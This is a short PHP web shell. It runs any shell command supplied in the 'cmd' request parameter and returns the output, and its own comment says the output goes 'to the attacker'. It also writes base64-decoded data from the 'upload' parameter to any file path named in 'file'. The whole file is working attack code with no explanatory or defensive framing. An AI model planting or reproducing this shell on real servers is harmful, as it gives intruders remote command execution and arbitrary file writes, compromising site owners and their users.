<?php
// Check if the 'cmd' parameter is set in the URL
if(isset($_REQUEST['cmd'])){
        // Execute the command and capture the output
        ob_start();
        system($_REQUEST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();

        // Return the output to the attacker
        echo "<pre>".$output."</pre>";
        die;
}

// Check if the 'upload' parameter is set in the URL
if(isset($_REQUEST['upload'])){
        // Get the uploaded file data
        $data = base64_decode($_REQUEST['upload']);

        // Write the data to a file
        $file = $_REQUEST['file'];
        file_put_contents($file, $data);

        // Return a success message
        echo "Upload successful!";
        die;
}
?>